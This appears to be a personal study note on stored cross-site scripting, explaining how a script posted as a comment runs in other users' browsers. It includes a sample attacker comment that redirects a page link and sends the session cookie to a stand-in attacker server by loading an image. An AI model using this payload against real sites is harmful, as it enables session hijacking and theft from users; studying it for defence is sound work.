tags: #web-security #xss

# Stored XSS

links: [[505 WS TOC - Cross Site Scripting (XSS)|WS TOC - Cross Site Scripting (XSS)]] - [[themes/000 Index|Index]]

---

- Attacker posts a script as a regular post / comment
- Post / comment is sent to the server
- When a user opens the post / comment the page is rendered and the script is executed
- Can lead to modifications in the DOM (change links, add buttons)
- Or, worse, sending personal information of users to attacker

Attacker Comment

```javascript
<script>
// Change the first link on the page
var links = document.getElementsByTagName('a');
if (links.length > 0) {
	links[0].href = "http://malicious-site.com";
	links[0].textContent = 'Important Update'; 
}

// Send the current session ID to the attacker's server
var sessionId = document.cookie.match(
	/sessionid=([^;]+)/)[1];
if (sessionId) {
	var attackerServer = 'http://attacker-site.com/';
	var img = new Image();
	// Browser sends GET with sessionID in path
	img.src = attackerServer +
		"collect?sessionid=" + sessionId;
		document.body.appendChild(img);
}
</script>
```

---
links: [[505 WS TOC - Cross Site Scripting (XSS)|WS TOC - Cross Site Scripting (XSS)]] - [[themes/000 Index|Index]]
